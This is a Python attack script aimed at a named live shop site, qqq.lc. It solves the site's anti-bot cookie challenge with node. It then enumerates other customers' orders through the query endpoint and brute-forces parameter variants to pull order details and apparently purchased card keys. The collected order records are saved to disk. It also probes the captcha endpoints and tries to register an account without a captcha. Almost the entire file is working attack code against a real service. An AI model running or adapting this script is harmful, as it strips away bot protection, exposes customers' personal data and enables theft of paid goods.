#!/usr/bin/env python3
import re, subprocess, json, time
from pathlib import Path

HOST='qqq.lc'; BASE=f'https://{HOST}'
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
OUT=Path('/tmp/qqqlc_out4'); OUT.mkdir(exist_ok=True)

class Jar:
    def __init__(self): self.c={}
    def header(self): return '; '.join(f'{k}={v}' for k,v in self.c.items())
    def absorb(self, hdr_text):
        for line in hdr_text.splitlines():
            if line.lower().startswith('set-cookie:'):
                part=line.split(':',1)[1].strip().split(';')[0]
                if '=' in part:
                    k,v=part.split('=',1); self.c[k.strip()]=v.strip()
jar=Jar()

def curl(path, method='GET', data=None, headers=None, t=45):
    cmd=['curl','-sk','-D','-','--max-time',str(t),'-A',UA,'-H',f'Referer: {BASE}/','--max-redirs','0']
    if jar.c: cmd+=['-H',f'Cookie: {jar.header()}']
    if headers:
        for k,v in headers.items(): cmd+=['-H',f'{k}: {v}']
    url=path if path.startswith('http') else BASE+path
    if method=='POST':
        cmd+=['-X','POST','-H','Content-Type: application/x-www-form-urlencoded','--data-binary',data or '']
    cmd.append(url)
    p=subprocess.run(cmd,capture_output=True,timeout=t+15)
    text=(p.stdout or b'').decode('utf-8','replace')
    hdr,body=(text.split('\r\n\r\n',1)+[''])[:2] if '\r\n\r\n' in text else (text,'')
    jar.absorb(hdr)
    code_m=re.search(r'HTTP/\S+\s+(\d+)',hdr)
    code=int(code_m.group(1)) if code_m else 0
    loc_m=re.search(r'(?im)^location:\s*(.+)$',hdr)
    return code, body, (loc_m.group(1).strip() if loc_m else '')

def pass_cc():
    code,body,loc=curl('/')
    m=re.search(r"setCookie\('ccsafe_defend',(.+?)\);",body)
    val=subprocess.check_output(['node','-e','console.log('+m.group(1)+')'],timeout=20).decode().strip()
    jar.c['ccsafe_defend']=val; jar.c['ccsafe_defend_time']='2'
    code,body,loc=curl('/')
    if code in (301,302) and loc:
        curl(loc.replace('http://qqq.lc','').replace('https://qqq.lc',''))
    print('cc ok', jar.header()[:100])

pass_cc()
xhr={'X-Requested-With':'XMLHttpRequest'}

def query(qq, page=1):
    code,body,_=curl('/ajax.php?act=query',method='POST',data=f'querytype=1&qq={qq}&page={page}',headers=xhr)
    return json.loads(body)

# collect orders across digits and pages focusing on status with result/endtime
orders=[]
for qq in list('123456789')+['11','12','13','qq','QQ','aa','ab','test','1@','138','139','150','188']:
    try:
        j=query(qq,1)
    except Exception as e:
        print('fail',qq,e); time.sleep(1); continue
    total=j.get('total') or 0
    print(f'qq={qq!r} total={total}')
    pages=min(5, (total+9)//10) if total else 0
    data=j.get('data') or {}
    if isinstance(data,dict):
        orders.extend(data.values())
    for p in range(2, pages+1):
        time.sleep(0.35)
        j2=query(qq,p)
        d2=j2.get('data') or {}
        if isinstance(d2,dict):
            orders.extend(d2.values())
    time.sleep(0.4)

# dedupe by id
uniq={}
for o in orders:
    if isinstance(o,dict) and o.get('id'):
        uniq[o['id']]=o
print('UNIQUE', len(uniq))
# status histogram + result non-null
from collections import Counter
print('STATUS', Counter(o.get('status') for o in uniq.values()))
with_result=[o for o in uniq.values() if o.get('result')]
print('WITH_RESULT', len(with_result))
with_end=[o for o in uniq.values() if o.get('endtime')]
print('WITH_END', len(with_end), 'sample statuses', Counter(o.get('status') for o in with_end))

# pick samples per status
by_st={}
for o in uniq.values():
    by_st.setdefault(o.get('status'), []).append(o)

# try detail fetch variants with skey
def try_detail(o, tag):
    oid=o['id']; skey=o.get('skey',''); tid=o.get('tid'); inp=o.get('input')
    variants=[
        f'id={oid}&skey={skey}',
        f'orderid={oid}&skey={skey}',
        f'id={oid}&key={skey}',
        f'id={oid}&skey={skey}&tid={tid}',
        f'id={oid}',
        f'skey={skey}',
        f'id={oid}&skey={skey}&input={inp}',
    ]
    for act in ['order','query','orders','get','card_check']:
        for data in variants[:4]:
            code,body,_=curl(f'/ajax.php?act={act}',method='POST',data=data,headers=xhr)
            if 'No Act' in body: 
                break
            interesting = ('卡' in body) or ('km' in body.lower()) or ('result' in body and 'null' not in body[:80]) or (body.startswith('{') and '"code":0' in body[:30] and act=='order')
            print(f'DET[{tag} st={o.get("status")}] {act} {data[:50]} -> {body[:250]}')
            time.sleep(0.2)
            if interesting and act=='order':
                (OUT/f'detail_{oid}.json').write_text(body)
                return body
    # GET style
    for url in [
        f'/ajax.php?act=order&id={oid}&skey={skey}',
        f'/?mod=order&id={oid}&skey={skey}',
        f'/?mod=faka&id={oid}&skey={skey}',
        f'/?mod=query&id={oid}&skey={skey}',
        f'/user/?mod=order&id={oid}&skey={skey}',
    ]:
        code,body,loc=curl(url)
        print(f'GET[{tag}] {url[:60]} code={code} loc={loc[:40]} len={len(body)} sn={body[:180].replace(chr(10)," ")}')
        time.sleep(0.25)
    return None

# test one of each status
for st, lst in sorted(by_st.items(), key=lambda x: str(x[0])):
    o=lst[0]
    print('==== STATUS', st, 'id', o['id'], 'result', o.get('result'), 'end', o.get('endtime'))
    try_detail(o, f'st{st}')
    time.sleep(0.3)

# specifically status 2 and 4 and any with result
for o in list(by_st.get(2, []))[:3] + list(by_st.get(4, []))[:3] + with_result[:3]:
    print('SPECIAL', o.get('status'), o['id'], o.get('result'), o.get('name','')[:40])
    try_detail(o, 'special')

# rainbow classic: md5(id+SYS_KEY+id) — skey already in response; try act=order with cookie query_check
# also try pay status check
for o in list(uniq.values())[:5]:
    oid=o['id']; skey=o['skey']
    for data in [f'trade_no={oid}', f'orderid={oid}', f'payorder={oid}']:
        code,body,_=curl('/ajax.php?act=order',method='POST',data=data+f'&skey={skey}',headers=xhr)
        print('PAYCHK', data, body[:200])
        time.sleep(0.2)

# save order sample dump
sample=list(uniq.values())[:50]
(OUT/'orders_sample.json').write_text(json.dumps(sample, ensure_ascii=False, indent=2))
print('saved', len(sample))

# check gt for geetest on login - captcha.php?
for p in ['/user/ajax.php?act=captcha','/user/ajax.php?act=geetest','/ajax.php?act=captcha','/user/captcha.php']:
    code,body,_=curl(p, method='POST', data='', headers=xhr)
    print('CAP', p, body[:200])

# reg open? try without captcha
code,body,_=curl('/user/ajax.php?act=reg', method='POST', data='user=reconqqq001&pwd=Test123456&qq=123456', headers=xhr)
print('REG_TRY', body[:250])

print('DONE')
